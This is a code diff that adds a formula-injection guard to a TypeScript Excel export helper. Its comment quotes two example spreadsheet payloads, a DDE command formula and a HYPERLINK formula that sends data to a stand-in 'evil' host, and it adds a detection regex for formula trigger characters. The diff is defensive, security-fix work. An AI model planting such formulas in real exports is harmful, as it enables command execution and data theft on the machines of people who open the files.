@@ -7,6 +7,30 @@ export interface ExcelExportOptions {
 }
 
 /**
+ * CSV / spreadsheet formula-injection neutralization (OWASP "CSV Injection" /
+ * CWE-1236). A cell whose text begins with = + - @ TAB or CR is interpreted as
+ * a formula by Excel / LibreOffice / Google Sheets when the file is opened, so
+ * operator-supplied strings (filter names, remarks, deviation reasons) that flow
+ * verbatim into these exports and land on a reviewer's / auditor's workstation —
+ * e.g. `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/"&<exfil>)` — would run.
+ *
+ * Prefix a single quote (Excel's recognized "treat as literal text" escape).
+ * Non-strings pass through so numbers keep their type. This is the deliberate
+ * twin of the backend `lib/spreadsheet-safe.ts` neutralizeFormula — the two live
+ * on opposite sides of the api/web boundary and cannot share a module; keep the
+ * FORMULA_TRIGGER regex identical in both. Added 2026-08-18 (VAPT-1): the
+ * client-side export path was the one export that never got this guard.
+ */
+const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
+
+function neutralizeCell(c: string | number | null | undefined): string | number {
+  if (c == null) return '';
+  if (typeof c === 'number') return c;
+  const s = String(c);
+  return FORMULA_TRIGGER.test(s) ? `'${s}` : s;
+}
+
+/**
  * Export a single-sheet .xlsx from a header row + body rows (the same
  * `head` / `body` shape pages already build for their PDF table). Column
  * widths auto-fit to content. Downloads immediately.
@@ -32,9 +56,11 @@ export async function exportToExcel({ filename, sheetName = 'Report', head, rows
     return { width: Math.min(Math.max(longest + 2, 8), 60) };
   });
 
-  ws.addRow(head);
+  // Header cells are developer-defined column labels, but neutralize them too —
+  // it is free and keeps a single rule for the whole sheet.
+  ws.addRow(head.map(neutralizeCell));
   for (const r of rows) {
-    ws.addRow(r.map((c) => (c == null ? '' : (typeof c === 'number' ? c : String(c)))));
+    ws.addRow(r.map(neutralizeCell));
   }
 
   const buffer = await wb.xlsx.writeBuffer();
